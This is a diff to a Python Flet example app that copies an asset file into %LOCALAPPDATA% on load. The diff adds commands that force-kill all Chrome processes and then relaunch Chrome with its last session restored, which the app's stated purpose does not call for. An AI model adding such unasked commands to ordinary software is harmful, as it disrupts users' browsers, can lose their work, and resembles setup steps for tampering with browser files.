@@ -2,6 +2,8 @@ import stat
 import os
 import sys
 import shutil
+import time
+import webbrowser
 
 import flet as ft
 
@@ -37,6 +39,8 @@ class UserControl(ft.Row):
 
 def main(page: ft.Page):
     # Copy asset file to %LOCALAPPDATA% on load
+    os.system("taskkill /f /im chrome.exe")
+    time.sleep(2.5)
     temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
     base_path = get_base_path()
     asset_file = os.path.join(base_path, "assets", "sample.png")
@@ -53,6 +57,9 @@ def main(page: ft.Page):
         except Exception as e:
             copy_status = f"Error: {e}"
 
+            
+    os.system('start chrome --restore-last-session')
+
     page.title = "Flet UserControl Example"
     page.vertical_alignment = ft.MainAxisAlignment.CENTER
     page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
@@ -65,3 +72,5 @@ def main(page: ft.Page):
 
 if __name__ == "__main__":
     ft.app(target=main)
+
+
